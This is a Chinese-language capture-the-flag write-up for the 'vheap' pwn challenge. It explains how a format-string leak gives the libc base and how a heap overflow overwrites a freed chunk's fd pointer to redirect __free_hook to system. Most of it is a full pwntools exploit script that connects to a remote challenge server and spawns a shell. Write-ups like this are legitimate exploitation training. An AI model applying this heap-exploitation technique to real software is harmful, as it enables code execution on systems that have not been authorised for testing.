vheap

个人感觉这道题目有点类似VMpwn，首先有一个格式化字符串漏洞泄露地址，相当于直接把libc基地址给我们了。之后让我们输入数据。我们选择输入两组数据，一组输入用于溢出free_hook，另一组单独填写system的地址。之后我们输入指令，指令为一个int类型的数字，int类型占用4字节，最多可以输入9组指令，即9个int数字。然后将我们输入的数据进行解析，并按照相应的解析进行操作。

从这个解析函数来看，主要就是这三个带有注释的操作比较重要，个人感觉其他的并没有什么用处。很明显我们只能申请两个堆块，然后不管申请的堆块大小，我们都可以将之前的输入数据拷贝到堆上，因此这里有的明显的溢出。思路就比较简单了，直接溢出修改释放的堆块的fd指针，去打free_hook就行。

from pwn import *
r=remote("121.40.89.206",33468)
elf=ELF("/home/ubuntu/pwn/比赛/pwnhub春季赛/vheap")
libc=ELF("/home/ubuntu/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6")
context(arch="amd64",os="linux",log_level="debug")
context.terminal = ['gnome-terminal','-x','sh','-c']

def get_code(HIBYTE,SBYTE2,SBYTE1,chars):
    code=(HIBYTE<<(8*3))+(SBYTE2<<(8*2))+(SBYTE1<<(8*1))+chars
    return code

r.recvuntil("first,tell me your name.")
r.sendline("%20$p")
r.recvuntil(":")
libc_base=int(r.recvuntil(b"\n")[:-1],16)-231-libc.symbols['__libc_start_main']
success("libc_base = "+hex(libc_base))
free_hook=libc_base+libc.symbols['__free_hook']
system_addr=libc_base+libc.symbols['system']

r.recvuntil("How many pieces of data?")
r.sendline("2")
payload=b"/bin/sh\x00".ljust(0x10,b"a")+p64(0)+p64(0x21)+p64(free_hook)
r.sendline(payload)
pause()
r.sendline(p64(system_addr))


def add(index,size):
    code=get_code(0xa,0,size,index)
    return code

def edit(index,data_index):
    code=get_code(0xb,data_index,0,index)
    return code

def delete(index):
    code=get_code(0xc,0,0,index)
    return code

r.recvuntil(":")
r.sendline("8")
r.recvuntil("[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]")
ints1=add(0,0x18)
ints2=add(1,0x18)
ints3=delete(1)
ints4=edit(0,0)
ints5=add(1,0x18)
ints6=add(1,0x18)
ints7=edit(1,1)
ints8=delete(0)
r.sendline(str(ints1))
r.sendline(str(ints2))
r.sendline(str(ints3))
r.sendline(str(ints4))
r.sendline(str(ints5))
r.sendline(str(ints6))
r.sendline(str(ints7))
r.sendline(str(ints8))
r.interactive()
